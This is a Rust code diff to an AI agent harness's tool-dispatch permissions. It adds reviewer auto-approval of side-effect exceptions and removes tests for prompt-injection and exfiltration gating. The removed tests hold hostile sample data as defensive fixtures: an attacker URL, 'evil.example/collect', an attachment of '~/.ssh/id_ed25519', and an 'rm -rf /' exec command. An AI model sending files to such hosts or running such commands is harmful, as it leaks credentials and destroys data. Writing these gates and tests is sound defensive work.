@@ -25,10 +25,9 @@ use denial_results::{
 };
 use dispatch_policy::{tool_denial_from_policy, DispatchPolicy};
 use host_permission::{
-    emit_permission_event, emit_permission_event_with_policy, emit_runtime_auto_approved_activity,
-    emit_runtime_denied_activity, emit_runtime_resolved_activity,
-    emit_runtime_unavailable_activity, request_host_permission, HostPermissionOutcome,
-    HostPermissionRequest,
+    emit_permission_event, emit_permission_event_with_policy, emit_runtime_denied_activity,
+    emit_runtime_resolved_activity, emit_runtime_unavailable_activity, record_allowed_dispatch,
+    request_host_permission, HostPermissionOutcome, HostPermissionRequest,
 };
 use primitive_args::{
     option_int as agent_primitive_option_int, option_str as agent_primitive_option_str,
@@ -754,6 +753,8 @@ async fn host_agent_dispatch_tool_call_impl(
     host_agent_dispatch_tool_call(ctx, call, tools.as_ref(), &options).await
 }
 
+use super::agent_host_tool_dispatch::{pin_scoped_tool_dispatch, ToolDispatchRequest};
+
 pub(super) async fn host_agent_dispatch_tool_call(
     ctx: crate::vm::AsyncBuiltinCtx,
     call: VmValue,
@@ -848,18 +849,38 @@ pub(super) async fn host_agent_dispatch_tool_call(
             // offer an explicit, dispatch-local ACP approval. The grant below
             // is exact (tool + active ceiling + required effect), non-stored,
             // and immediately rechecked before the call can proceed.
-            match request_side_effect_permission(
-                bridge.as_ref(),
-                &session_id,
-                &tool_id,
+            // Offer the ceiling refusal to the reviewer before the host, the
+            // same order the approval-policy path uses. Without this a run
+            // carrying both a capability policy and a reviewer refuses the
+            // call and never asks (harn#7982), which is every product loop.
+            let reviewer_decision = crate::orchestration::maybe_grant_side_effect_by_auto_review(
+                Some(&ctx),
                 &tool_name,
                 &tool_args,
-                violation,
-                policy_denial.reason.clone(),
-                permission_context_for(tools, &tool_name),
+                &session_id,
+                violation.ceiling.as_str(),
+                violation.required_level.as_str(),
+                &policy_denial.reason,
             )
-            .await
-            {
+            .await;
+            let reviewer_granted = reviewer_decision.is_some();
+            let ceiling_outcome = match reviewer_decision {
+                Some(policy_decision) => SideEffectPermissionOutcome::Allowed { policy_decision },
+                None => {
+                    request_side_effect_permission(
+                        bridge.as_ref(),
+                        &session_id,
+                        &tool_id,
+                        &tool_name,
+                        &tool_args,
+                        violation,
+                        policy_denial.reason.clone(),
+                        permission_context_for(tools, &tool_name),
+                    )
+                    .await
+                }
+            };
+            match ceiling_outcome {
                 SideEffectPermissionOutcome::Allowed { policy_decision } => {
                     let Some(grant) = policy_denial.side_effect_grant_for(&tool_name) else {
                         return Err(VmError::Runtime(
@@ -882,13 +903,21 @@ pub(super) async fn host_agent_dispatch_tool_call(
                         )
                         .await);
                     }
-                    approval_status = Some("host_granted");
+                    approval_status = Some(if reviewer_granted {
+                        "auto_review_granted"
+                    } else {
+                        "host_granted"
+                    });
                     emit_permission_event_with_policy(
                         &session_id,
                         "PermissionGrant",
                         &tool_name,
                         &tool_args,
-                        "host approved one-time side-effect ceiling exception",
+                        if reviewer_granted {
+                            "reviewer approved one-time side-effect ceiling exception"
+                        } else {
+                            "host approved one-time side-effect ceiling exception"
+                        },
                         true,
                         Some(policy_decision),
                     );
@@ -1119,17 +1148,13 @@ pub(super) async fn host_agent_dispatch_tool_call(
 
     match approval {
         None => {}
-        Some(decision) if decision.is_allow() && decision.has_audit_signal() => {
-            emit_permission_event_with_policy(
-                &session_id,
-                "PermissionGrant",
-                &tool_name,
-                &tool_args,
-                &decision.reason,
-                false,
-                Some(decision.receipt.clone()),
-            );
-            emit_runtime_auto_approved_activity(&session_id, &tool_id, &tool_name, &decision);
+        // One arm for every allowed dispatch; the recorder names whoever
+        // decided it. The old audit-signal condition also dropped a reviewer
+        // grant on a rule carrying no id and no risk label.
+        Some(decision)
+            if decision.is_allow() && crate::orchestration::decision_records_a_grant(&decision) =>
+        {
+            record_allowed_dispatch(&session_id, &tool_id, &tool_name, &tool_args, &decision);
         }
         Some(decision) if decision.is_deny() => {
             emit_runtime_denied_activity(&session_id, &tool_id, &tool_name, &decision);
@@ -1442,27 +1467,25 @@ pub(super) async fn host_agent_dispatch_tool_call(
     )
     .map(|(handle, guard)| (Some(handle), Some(guard)))
     .unwrap_or((None, None));
-    // Heap-pin the dispatch future. The tool-execution path builds large
-    // per-call state (e.g. `LlmCallOptions`/`LlmRequestPayload`), so keeping
-    // this future inline in the parent frame pushes the enclosing async fn
-    // over clippy's `large_stack_frames` threshold. Boxing moves that state
-    // onto the heap; both await arms below consume the `Pin<Box<_>>` directly.
-    let mut dispatch_future = Box::pin(crate::orchestration::scope_agent_session(
+    // Heap-pin the dispatch future on a frame that dies immediately. The
+    // tool-execution path builds large per-call state (e.g.
+    // `LlmCallOptions`/`LlmRequestPayload`), and both await arms below consume
+    // the `Pin<Box<_>>` directly, but the box alone is not enough: see
+    // `pin_scoped_tool_dispatch`.
+    let mut dispatch_future = pin_scoped_tool_dispatch(
         session_id.clone(),
-        crate::agent_sessions::scope_current_tool_call(tool_id.clone(), async {
-            agent_tools::dispatch_tool_execution_with_mcp(
-                Some(&ctx),
-                &tool_name,
-                &tool_args,
-                tools,
-                mcp_clients_ref,
-                bridge.as_ref(),
-                tool_retries,
-                tool_backoff_ms,
-            )
-            .await
-        }),
-    ));
+        tool_id.clone(),
+        ToolDispatchRequest {
+            ctx: &ctx,
+            tool_name: &tool_name,
+            tool_args: &tool_args,
+            tools,
+            mcp_clients: mcp_clients_ref,
+            bridge: bridge.as_ref(),
+            tool_retries,
+            tool_backoff_ms,
+        },
+    );
     let (outcome, preempted_by_cancel) = match cancel_handle.as_ref() {
         Some(handle) => {
             // Race the dispatch against the cancellation signal. When the
@@ -1491,6 +1514,7 @@ pub(super) async fn host_agent_dispatch_tool_call(
                             category: crate::value::ErrorCategory::Cancelled,
                         }),
                         executor: None,
+                        declared_failure: None,
                     },
                     true,
                 ),
@@ -1499,10 +1523,11 @@ pub(super) async fn host_agent_dispatch_tool_call(
         None => (dispatch_future.await, false),
     };
     let execution_duration_ms = started.elapsed().as_millis() as u64;
+    let declared_failure = outcome.declared_failure;
     let executor = outcome
         .executor
         .as_ref()
-        .and_then(|executor| serde_json::to_value(executor).ok());
+        .and_then(|e| serde_json::to_value(e).ok());
 
     // If the dispatch was actually preempted by `cancel_in_flight_tool_call`,
     // surface a `status: "cancelled"` tool_result rather than tearing down
@@ -1592,23 +1617,18 @@ pub(super) async fn host_agent_dispatch_tool_call(
             ))
             .await?;
             let denied = agent_tools::is_denied_tool_result(&raw_result);
-            // A dispatch that returned `Ok(..)` can still carry a failure in the
-            // result body (host-bridge `{ok:false}` / `{status:"error"}` /
-            // `{error:".."}` envelopes, or an MCP-shaped `{isError:true}` that
-            // wasn't already thrown). Surface those as a failure instead of
-            // laundering them into `ok:true` — the agent loop reads `ok`/`status`
-            // to decide whether the tool succeeded.
-            let body_failure = if denied {
-                None
-            } else {
-                agent_tools::ok_result_failure_category(&raw_result)
-            };
-            let is_failure = denied || body_failure.is_some();
+            // A dispatch that returned `Ok(..)` can still carry a failure in its
+            // body (`{ok:false}` / `{status:"error"}` / `{error:".."}`, or an
+            // MCP-shaped `{isError:true}`). Surface those instead of laundering
+            // them into `ok:true`: the agent loop reads `ok`/`status`.
+            // Prefer the pre-coercion declaration: a dict-returning handler's
+            // coerced payload no longer parses (harn#7884).
             let error_category = if denied {
                 Some("tool_rejected")
             } else {
-                body_failure
+                declared_failure.or_else(|| agent_tools::ok_result_failure_category(&raw_result))
             };
+            let is_failure = error_category.is_some();
             let observation =
                 format!("[result of {tool_name}]\n{rendered}\n[end of {tool_name} result]\n");
             let error = is_failure.then(|| rendered.clone());
@@ -2002,854 +2022,24 @@ async fn host_agent_reminder_providers_fire_impl(
 }
 
 #[cfg(test)]
-mod security_gate_tests {
-    use super::{trifecta_gate_reason, upgrade_to_trifecta_ask};
-
-    fn allow_decision() -> crate::orchestration::PolicyEvaluation {
-        crate::orchestration::PolicyEvaluation {
-            action: "allow".to_string(),
-            reason: "auto-approved".to_string(),
-            matched_rule: None,
-            required_approval: None,
-            risk_labels: Vec::new(),
-            receipt: serde_json::json!({
-                "type": "policy_decision",
-                "action": "allow",
-                "reason": "auto-approved",
-                "risk_labels": [],
-            }),
-        }
-    }
-
-    #[test]
-    fn trifecta_upgrade_syncs_decision_and_receipt() {
-        let mut decision = allow_decision();
-        upgrade_to_trifecta_ask(
-            &mut decision,
-            "untrusted content + exfil tool".to_string(),
-            &[],
-        );
-
-        assert_eq!(decision.action, "ask");
-        assert_eq!(decision.reason, "untrusted content + exfil tool");
-        assert!(decision.risk_labels.iter().any(|l| l == "lethal_trifecta"));
-
-        // The audit receipt (sent to the host as `policyDecision`) must agree
-        // with the upgraded decision so the approval UI can surface the reason.
-        assert_eq!(decision.receipt["action"], "ask");
-        assert_eq!(decision.receipt["reason"], "untrusted content + exfil tool");
-        assert_eq!(decision.receipt["risk_labels"][0], "lethal_trifecta");
-    }
-
-    #[test]
-    fn trifecta_upgrade_does_not_duplicate_label() {
-        let mut decision = allow_decision();
-        decision.risk_labels.push("lethal_trifecta".to_string());
-        upgrade_to_trifecta_ask(&mut decision, "reason".to_string(), &[]);
-        let count = decision
-            .risk_labels
-            .iter()
-            .filter(|l| *l == "lethal_trifecta")
-            .count();
-        assert_eq!(count, 1);
-    }
-
-    #[test]
-    fn trifecta_upgrade_adds_extra_labels_without_dropping_trifecta() {
-        let mut decision = allow_decision();
-        upgrade_to_trifecta_ask(
-            &mut decision,
-            "flagged injection + write tool".to_string(),
-            &["prompt_injection"],
-        );
-        assert!(decision.risk_labels.iter().any(|l| l == "lethal_trifecta"));
-        assert!(decision.risk_labels.iter().any(|l| l == "prompt_injection"));
-        // Receipt mirrors the labels for the host/UI.
-        let labels = decision.receipt["risk_labels"]
-            .as_array()
-            .expect("risk_labels array");
-        assert!(labels.iter().any(|l| l == "prompt_injection"));
-    }
-
-    #[test]
-    fn flagged_injection_plus_write_tool_gates_via_detection_axis() {
-        use crate::config::{SecurityConfig, SecurityMode};
-        use crate::security::{DetectorVerdict, SecurityPolicy, TaintRecord, TrustLevel};
-        use crate::tool_annotations::{SideEffectLevel, ToolAnnotations};
-
-        let policy = SecurityPolicy::from_config(&SecurityConfig {
-            mode: SecurityMode::LocalMl,
-            ..Default::default()
-        });
-        assert!(policy.detect_injection, "local-ml enables detection");
-
-        let write_ann = ToolAnnotations {
-            side_effect_level: SideEffectLevel::WorkspaceWrite,
-            ..Default::default()
-        };
-        let taint = |flagged: bool, score: f64| {
-            vec![TaintRecord {
-                origin: "fetch:web_fetch".to_string(),
-                trust: TrustLevel::Untrusted,
-                introduced_by: "call-1".to_string(),
-                detector: Some(DetectorVerdict {
-                    model: "heuristic-v1".to_string(),
-                    score,
-                    flagged,
-                }),
-                labels: Vec::new(),
-                endpoints: Vec::new(),
-            }]
-        };
-
-        // Flagged injection + a workspace-write tool trips the detection axis.
-        let outcome = trifecta_gate_reason(
-            &policy,
-            Some(&write_ann),
-            "write_file",
-            &serde_json::json!({}),
-            &taint(true, 0.85),
-        )
-        .expect("detection axis fires");
-        assert!(outcome.injection_flagged);
-        assert!(
-            outcome.reason.contains("85% confidence"),
-            "{}",
-            outcome.reason
-        );
-        assert!(outcome.reason.contains("modifies workspace files"));
-
-        // A benign (not-flagged) verdict does NOT gate a workspace write.
-        assert!(
-            trifecta_gate_reason(
-                &policy,
-                Some(&write_ann),
-                "write_file",
-                &serde_json::json!({}),
-                &taint(false, 0.10),
-            )
-            .is_none(),
-            "unflagged content must not gate benign writes"
-        );
-    }
-
-    #[test]
-    fn mounted_untrusted_server_data_cannot_reach_an_egress_sink_ungated() {
-        // Part #3 (quarantine): an untrusted mounted-MCP-server result in
-        // context plus an exfil-capable tool trips the lethal-trifecta gate.
-        // This is already covered by the substrate; the test proves it holds.
-        use crate::config::SecurityConfig;
-        use crate::security::{SecurityPolicy, TaintRecord, TrustLevel};
-        use crate::tool_annotations::{SideEffectLevel, ToolAnnotations};
-
-        let policy = SecurityPolicy::from_config(&SecurityConfig::default());
-        let mounted_untrusted = vec![TaintRecord {
-            // `classify_result_trust` tags a mounted server's result
-            // `mcp:{server}` Untrusted (see `security::tests`); the same origin
-            // reaches the gate here.
-            origin: "mcp:untrusted-connector".to_string(),
-            trust: TrustLevel::Untrusted,
-            introduced_by: "call-mount-1".to_string(),
-            detector: None,
-            labels: Vec::new(),
-            endpoints: Vec::new(),
-        }];
-        let egress = ToolAnnotations {
-            side_effect_level: SideEffectLevel::Network,
-            ..Default::default()
-        };
-        let outcome = trifecta_gate_reason(
-            &policy,
-            Some(&egress),
-            "http_post",
-            &serde_json::json!({}),
-            &mounted_untrusted,
-        )
-        .expect("untrusted mounted-server data + egress tool must gate");
-        assert!(outcome.reason.contains("mcp:untrusted-connector"));
-        assert!(outcome.reason.contains("external destination"));
-
-        // The gate is sink-specific: the same untrusted taint plus a read-only,
-        // non-egress tool does NOT gate — quarantine fires only at a real
-        // lethal-trifecta sink, not on every tool while tainted.
-        assert!(
-            trifecta_gate_reason(
-                &policy,
-                Some(&ToolAnnotations::default()),
-                "read_file",
-                &serde_json::json!({"path": "src/main.rs"}),
-                &mounted_untrusted,
-            )
-            .is_none(),
-            "untrusted taint + a non-sink read tool must not gate"
-        );
-    }
-
-    #[test]
-    fn precise_exfil_gate_narrows_to_attacker_named_destinations() {
-        // Precise mode makes the exfil axis fire on the real attack signature —
-        // the untrusted content controls the destination — instead of on any
-        // exfil-capable tool while any untrusted content is in context. This is
-        // what keeps benign research/synthesis to a user-named sink quiet.
-        use crate::config::SecurityConfig;
-        use crate::security::{SecurityPolicy, TaintRecord, TrustLevel};
-        use crate::tool_annotations::{SideEffectLevel, ToolAnnotations};
-
-        let precise = SecurityPolicy::from_config(&SecurityConfig {
-            precise_exfil_gate: true,
-            ..Default::default()
-        });
-        let coarse = SecurityPolicy::from_config(&SecurityConfig::default());
-        // Untrusted content that names an attacker destination (as the ingest
-        // path would record via `extract_endpoints`).
-        let taint = vec![TaintRecord {
-            origin: "fetch:web_fetch".to_string(),
-            trust: TrustLevel::Untrusted,
-            introduced_by: "call-1".to_string(),
-            detector: None,
-            labels: Vec::new(),
-            endpoints: vec!["evil.example".to_string()],
-        }];
-        let egress = ToolAnnotations {
-            side_effect_level: SideEffectLevel::Network,
-            ..Default::default()
-        };
-        let post = |args: serde_json::Value, policy: &SecurityPolicy| {
-            trifecta_gate_reason(policy, Some(&egress), "http_post", &args, &taint)
-        };
-
-        // Attack: the sink targets the attacker-named destination -> gates.
-        assert!(post(
-            serde_json::json!({"url": "https://evil.example/collect"}),
-            &precise
-        )
-        .is_some());
-        // Benign synthesis: writing to a user-named destination not present in the
-        // untrusted content is NOT gated under precise mode...
-        assert!(post(
-            serde_json::json!({"url": "https://notion.so/my-page"}),
-            &precise
-        )
-        .is_none());
-        // ...but the coarse gate would nag on exactly that benign write.
-        assert!(post(
-            serde_json::json!({"url": "https://notion.so/my-page"}),
-            &coarse
-        )
-        .is_some());
-        // A secret payload gates even to a user-named sink.
-        assert!(post(
-            serde_json::json!({"url": "https://notion.so/my-page", "attach": "~/.ssh/id_ed25519"}),
-            &precise,
-        )
-        .is_some());
-    }
-
-    #[test]
-    fn forged_directive_taint_gates_an_egress_tool() {
-        // Ties part #1 (provenance) to part #3 (quarantine): a forged directive
-        // classified untrusted by `classify_directive_trust` lands on the taint
-        // ledger with the `forged_directive` origin, so the trifecta gate fires
-        // when an exfil tool then runs.
-        use crate::config::SecurityConfig;
-        use crate::security::{SecurityPolicy, TaintRecord, TrustLevel};
-        use crate::tool_annotations::ToolAnnotations;
-
-        let policy = SecurityPolicy::from_config(&SecurityConfig::default());
-        let forged = vec![TaintRecord {
-            origin: crate::security::provenance::FORGED_DIRECTIVE_ORIGIN.to_string(),
-            trust: TrustLevel::Untrusted,
-            introduced_by: "subagent-result-1".to_string(),
-            detector: None,
-            labels: Vec::new(),
-            endpoints: Vec::new(),
-        }];
-        let outcome = trifecta_gate_reason(
-            &policy,
-            Some(&ToolAnnotations::default()),
-            "web_fetch",
-            &serde_json::json!({}),
-            &forged,
-        )
-        .expect("forged-directive taint + fetch tool must gate");
-        assert!(outcome.reason.contains("forged_directive"));
-    }
-}
-
-#[cfg(test)]
-mod denied_tool_routing_tests {
-    //! `agent_primitive_denied_tool` must pick its model-facing result body by
-    //! category: RECOVERABLE rejections (schema/argument validation, malformed
-    //! tool name) coach a retry-with-correction, while TRUE policy/permission
-    //! denials keep the don't-retry body. Reverting the split (sending every
-    //! category through `denied_tool_result`) fails the recoverable assertions.
-    use super::{agent_primitive_denied_tool, deny_tool_call, DenialEvidence};
-    use crate::agent_events::ToolCallErrorCategory;
-
-    #[test]
-    fn schema_validation_missing_param_yields_invalid_arguments_retry_positive() {
-        let envelope = agent_primitive_denied_tool(
-            "edit",
-            "call_1",
-            &serde_json::json!({ "content": "x" }),
-            "Tool 'edit' is missing required parameter(s): path. \
-             Provide all required parameters and try again.",
-            ToolCallErrorCategory::SchemaValidation,
-            None,
-            None,
-        );
-        // Envelope-level category is still schema_validation for the wire...
-        assert_eq!(envelope["error_category"], "schema_validation");
-        // ...but the inner model-facing result is retry-positive, NOT a denial.
-        let result = &envelope["result"];
-        assert_eq!(result["error"], serde_json::json!("invalid_arguments"));
-        assert_ne!(result["error"], serde_json::json!("permission_denied"));
-        let observation = envelope["observation"]
-            .as_str()
-            .expect("recoverable rejection should carry model-facing observation");
-        assert!(
-            observation.starts_with("[result of edit]\n") && observation.contains("[end of edit result]"),
-            "recoverable argument rejection must use normal tool-result framing, got: {observation}"
-        );
-        let next = result["next_step"].as_str().expect("next_step");
-        assert!(
-            !next.contains("Do not retry"),
-            "schema rejection must be retry-positive: {next}"
-        );
-        assert!(
-            next.contains("Re-call") && next.contains("edit") && next.contains("path"),
-            "next_step should re-call the named tool with the missing param: {next}"
-        );
-    }
-
-    #[test]
-    fn empty_tool_name_yields_recoverable_retry_positive_feedback() {
-        let envelope = agent_primitive_denied_tool(
-            "<unnamed>",
-            "call_2",
-            &serde_json::json!({}),
-            "Tool call is missing a name. Emit one tool call per turn as \
-             `name({ ... })` using a non-empty tool name from the allowed list, then retry.",
-            ToolCallErrorCategory::SchemaValidation,
-            None,
-            None,
-        );
-        let result = &envelope["result"];
-        assert_eq!(result["error"], serde_json::json!("invalid_arguments"));
-        let next = result["next_step"].as_str().expect("next_step");
-        assert!(
-            !next.contains("Do not retry"),
-            "empty-name slip must be retry-positive: {next}"
-        );
-    }
-
-    #[test]
-    fn retryable_arg_constraint_denial_is_coached_as_recoverable() {
-        use crate::agent_events::{DenialGate, ToolDenial};
-        // A sub-agent scoped to `test/users.*` that tried to edit the shared
-        // reference file: the tool is permitted, only this path is out of scope.
-        let denial = ToolDenial::retryable(
-            DenialGate::ArgConstraint,
-            None,
-            "tool 'edit' path 'test/accounts.integration.test.ts' is outside your allowed \
-             scope. Allowed path pattern(s): [\"test/users.*\"]. This is fixable: re-issue \
-             the call with a path that matches one of those patterns.",
-        );
-        let envelope = agent_primitive_denied_tool(
-            "edit",
-            "call_3",
-            &serde_json::json!({ "path": "test/accounts.integration.test.ts" }),
-            denial.reason.clone(),
-            ToolCallErrorCategory::PermissionDenied,
-            Some(&denial),
-            None,
-        );
-        let result = &envelope["result"];
-        // Retry-positive body, NOT a hard permission denial.
-        assert_eq!(result["error"], serde_json::json!("invalid_arguments"));
-        assert_ne!(result["error"], serde_json::json!("permission_denied"));
-        let next = result["next_step"].as_str().expect("next_step");
-        assert!(
-            !next.contains("Do not retry"),
-            "retryable arg-scope denial must coach a correction, not give-up: {next}"
-        );
-        // The structured denial still records the precise gate + retryable flag.
-        assert_eq!(envelope["denial"]["gate"], "arg_constraint");
-        assert_eq!(envelope["denial"]["retryable"], true);
-    }
-
-    #[test]
-    fn tool_call_wrapper_ceiling_denial_yields_embedded_call_repair() {
-        use crate::agent_events::{DenialGate, ToolDenial};
-        // Live headless pathology: the model emitted a native call NAMED
-        // `tool_call` whose arguments carried a correct text-format call. The
-        // ceiling denial must come back as parse-repair feedback that names
-        // the embedded call — never permission vocabulary the model answers
-        // by petitioning a user that does not exist.
-        use crate::orchestration::{pop_execution_policy, push_execution_policy, CapabilityPolicy};
-        let denial = ToolDenial::terminal(
-            DenialGate::ToolCeiling,
-            None,
-            "tool 'tool_call' exceeds tool ceiling",
-        );
-        // A ToolCeiling denial implies an active policy with a non-empty tool
-        // allowlist — mirror that precondition so the embedded call validates.
-        push_execution_policy(CapabilityPolicy {
-            tools: vec!["look".to_string(), "search".to_string(), "edit".to_string()],
-            ..Default::default()
-        });
-        let envelope = futures::executor::block_on(deny_tool_call(
-            None,
-            "",
-            "tool_call",
-            "call_8",
-            &serde_json::json!(
-                "<tool_call>\nlook({ file: \"src/main.rs\", intent: \"read\" })\n</tool_call>"
-            ),
-            denial,
-            false,
-            DenialEvidence::new(None, None),
-        ));
-        pop_execution_policy();
-        let result = &envelope["result"];
-        assert_eq!(result["error"], serde_json::json!("invalid_arguments"));
-        let next = result["next_step"].as_str().expect("next_step");
-        assert!(
-            next.contains("look(") && next.contains("src/main.rs"),
-            "repair must show the corrected direct invocation: {next}"
-        );
-        assert!(
-            !next.to_lowercase().contains("permission") && !next.contains("Do not retry"),
-            "repair must be retry-positive with no permission framing: {next}"
-        );
-        // The structured denial names the wrapper-syntax cause instead of the
-        // lower-level policy gate and flips retryable: re-issuing WITH the
-        // correction is exactly the coached next move.
-        assert_eq!(envelope["denial"]["gate"], "malformed_tool_wrapper");
-        assert_eq!(envelope["denial"]["retryable"], true);
-        assert_eq!(result["denial"]["gate"], "malformed_tool_wrapper");
-        assert_eq!(result["denial"]["retryable"], true);
-        assert!(DenialGate::MalformedToolWrapper.owns_reason(result["reason"].as_str().unwrap()));
-        assert_eq!(result["denial"]["reason"], result["reason"]);
-        assert_eq!(envelope["error"], result["reason"]);
-        // The wire-level category is unchanged for host harnesses.
-        assert_eq!(envelope["error_category"], "permission_denied");
-    }
-
-    #[test]
-    fn unknown_tool_ceiling_denial_drops_permission_framing() {
-        use crate::agent_events::{DenialGate, ToolDenial};
-        // A plain unknown/excluded name (no embedded call to repair) gets the
-        // action-oriented unavailable-tool body: name the failure class, steer
-        // off a re-send — never "what you need permission for".
-        let denial = ToolDenial::terminal(
-            DenialGate::ToolCeiling,
-            None,
-            "tool 'repo_browser.bundle' exceeds tool ceiling",
-        );
-        let envelope = agent_primitive_denied_tool(
-            "repo_browser.bundle",
-            "call_9",
-            &serde_json::json!({ "path": "src" }),
-            denial.reason.clone(),
-            ToolCallErrorCategory::PermissionDenied,
-            Some(&denial),
-            None,
-        );
-        let result = &envelope["result"];
-        assert_eq!(result["error"], serde_json::json!("unknown_tool"));
-        let next = result["next_step"].as_str().expect("next_step");
-        assert!(
-            !next.to_lowercase().contains("permission") && !next.contains("not permitted"),
-            "name-resolution denial must not use permission framing: {next}"
-        );
-        assert!(
-            next.contains("not one of the available tools"),
-            "next_step should name the failure class: {next}"
-        );
-        // Still terminal: re-sending the identical call can never succeed.
-        assert_eq!(envelope["denial"]["gate"], "tool_ceiling");
-        assert_eq!(envelope["denial"]["retryable"], false);
-        assert_eq!(envelope["error_category"], "permission_denied");
-    }
-
-    #[test]
-    fn hard_capability_denial_stays_terminal() {
-        use crate::agent_events::{DenialGate, ToolDenial};
-        let denial = ToolDenial::terminal(
-            DenialGate::CapabilityCeiling,
-            Some("workspace.write_text".to_string()),
-            "tool 'edit' exceeds capability ceiling: workspace.write_text",
-        );
-        let envelope = agent_primitive_denied_tool(
-            "edit",
-            "call_4",
-            &serde_json::json!({ "path": "x" }),
-            denial.reason.clone(),
-            ToolCallErrorCategory::PermissionDenied,
-            Some(&denial),
-            None,
-        );
-        let result = &envelope["result"];
-        assert_eq!(result["error"], serde_json::json!("permission_denied"));
-        let next = result["next_step"].as_str().expect("next_step");
-        assert!(
-            next.contains("Do not retry"),
-            "a hard capability ceiling must stay terminal: {next}"
-        );
-    }
-
-    #[test]
-    fn arg_scoped_dynamic_permission_denial_is_coached_as_recoverable() {
-        use crate::agent_events::{DenialGate, ToolDenial};
-        // A dynamic permission rule denied a specific path while the tool itself
-        // is permitted (analogous to ArgConstraint): coach a retry with an
-        // allowed value rather than a terminal "do not retry".
-        let denial = ToolDenial::retryable(
-            DenialGate::DynamicPermission,
-            None,
-            "permission denied: path 'docs/secret.md' is outside custom path scope",
-        );
-        let envelope = agent_primitive_denied_tool(
-            "edit",
-            "call_5",
-            &serde_json::json!({ "path": "docs/secret.md" }),
-            denial.reason.clone(),
-            ToolCallErrorCategory::PermissionDenied,
-            Some(&denial),
-            None,
-        );
-        let result = &envelope["result"];
-        // Retry-positive body, NOT a hard permission denial.
-        assert_eq!(result["error"], serde_json::json!("invalid_arguments"));
-        assert_ne!(result["error"], serde_json::json!("permission_denied"));
-        let next = result["next_step"].as_str().expect("next_step");
-        assert!(
-            !next.contains("Do not retry"),
-            "arg-scoped dynamic-permission denial must coach a correction: {next}"
-        );
-        assert_eq!(envelope["denial"]["gate"], "dynamic_permission");
-        assert_eq!(envelope["denial"]["retryable"], true);
-    }
-
-    #[test]
-    fn hard_dynamic_permission_ceiling_stays_terminal() {
-        use crate::agent_events::{DenialGate, ToolDenial};
-        // The whole tool is denied by the dynamic policy: a retry can't help.
-        let denial = ToolDenial::terminal(
-            DenialGate::DynamicPermission,
-            None,
-            "permission denied: tool 'exec' is not allowed by this agent's permissions",
-        );
-        let envelope = agent_primitive_denied_tool(
-            "exec",
-            "call_6",
-            &serde_json::json!({ "command": "rm -rf /" }),
-            denial.reason.clone(),
-            ToolCallErrorCategory::PermissionDenied,
-            Some(&denial),
-            None,
-        );
-        let result = &envelope["result"];
-        assert_eq!(result["error"], serde_json::json!("permission_denied"));
-        let next = result["next_step"].as_str().expect("next_step");
-        assert!(
-            next.contains("Do not retry"),
-            "a hard dynamic-permission ceiling must stay terminal: {next}"
-        );
-        assert_eq!(envelope["denial"]["retryable"], false);
-    }
-
-    #[test]
-    fn approval_unavailable_and_host_rejected_stay_terminal() {
-        use crate::agent_events::{DenialGate, ToolDenial};
-        // ApprovalUnavailable means no approver exists; HostRejected means the
-        // user said no. A retry yields the same result, so both stay terminal
-        // and are never marked recoverable.
-        for gate in [DenialGate::ApprovalUnavailable, DenialGate::HostRejected] {
-            let denial = ToolDenial::terminal(gate, None, "approval refused");
-            assert!(!denial.retryable, "{} must stay terminal", gate.as_str());
-            let envelope = agent_primitive_denied_tool(
-                "exec",
-                "call_7",
-                &serde_json::json!({ "command": "ls" }),
-                denial.reason.clone(),
-                ToolCallErrorCategory::PermissionDenied,
-                Some(&denial),
-                None,
-            );
-            let result = &envelope["result"];
-            assert_eq!(result["error"], serde_json::json!("permission_denied"));
-            let next = result["next_step"].as_str().expect("next_step");
-            assert!(
-                next.contains("Do not retry"),
-                "{} must stay terminal: {next}",
-                gate.as_str()
-            );
-        }
-    }
-
-    use super::arg_delivery_fault_feedback;
-
-    #[test]
-    fn empty_args_with_length_truncation_names_the_truncation_cause() {
-        let (reason, cause) =
-            arg_delivery_fault_feedback("edit", &serde_json::json!({}), Some("length"))
-                .expect("empty args must be cause-named");
-        assert_eq!(cause, "empty_arguments_truncated");
-        assert!(
-            reason.contains("TRUNCATED") && reason.contains("output"),
-            "length-truncated empty args must name the output-limit cut: {reason}"
-        );
-        assert!(
-            reason.contains("shorter") || reason.contains("split"),
-            "truncation feedback must coach a smaller re-issue: {reason}"
-        );
-        assert!(
-            !reason.contains("missing required parameter"),
-            "must not misdiagnose as a missing-parameter slip: {reason}"
-        );
-        // Anthropic spelling and provider casing route to the same cause.
-        let (_, cause) =
-            arg_delivery_fault_feedback("edit", &serde_json::Value::Null, Some("MAX_TOKENS"))
-                .expect("null args must be cause-named");
-        assert_eq!(cause, "empty_arguments_truncated");
-    }
-
-    #[test]
-    fn empty_args_with_clean_stop_names_the_provider_fault_cause() {
-        for stop_reason in [Some("stop"), Some("tool_calls"), None] {
-            let (reason, cause) =
-                arg_delivery_fault_feedback("edit", &serde_json::json!({}), stop_reason)
-                    .expect("empty args must be cause-named");
-            assert_eq!(cause, "empty_arguments_dropped");
-            assert!(
-                reason.contains("EMPTY arguments") && reason.contains("provider"),
-                "clean-stop empty args must name the provider fault: {reason}"
-            );
-            assert!(
-                reason.contains("Re-issue the same call"),
-                "provider-fault feedback must coach an identical re-issue: {reason}"
-            );
-        }
-    }
-
-    // REAL captured bytes from a live llamacpp qwen3.6-35b turn
-    // (burin-examples/swift conversation 1b42844f): the model authored an
-    // `edit(action=create, content=<large file>)` call whose native
-    // `function.arguments` stream was cut mid-`content`, so the streamed-arg
-    // parser handed dispatch a `{"__parse_error": "..."}` carrier. Validation
-    // then reported "missing required parameter: path" and the model, told to
-    // "re-call with path" (which it HAD supplied), re-issued the same oversized
-    // edit and truncated again — 21 llm calls, 28 failed tool calls, idle with
-    // no visible reply. The carrier must be named as a truncation, not a slip.
-    const CAPTURED_TRUNCATION_CARRIER: &str = "Could not parse streamed tool arguments as JSON \
-        or Harn text-tool arguments: JSON error: EOF while parsing a value at line 1 column 1401; \
-        Harn text-tool error: TOOL CALL PARSE ERROR: `edit{...}` — unexpected end of input. Tool \
-        arguments must be a TypeScript object literal. Raw: {\"path\":\"Sources/SysMonCore/\
-        Providers/LiveSystemProvider.swift\",\"action\":\"create\",\"content\":\"import Foundation";
-
-    #[test]
-    fn truncated_toolcall_carrier_names_the_truncation_not_a_missing_param() {
-        let carrier = serde_json::json!({ "__parse_error": CAPTURED_TRUNCATION_CARRIER });
-        let (reason, cause) = arg_delivery_fault_feedback("edit", &carrier, Some("tool_calls"))
-            .expect("a __parse_error carrier must be cause-named, not left to the validator");
-        assert_eq!(cause, "arguments_truncated");
-        assert!(
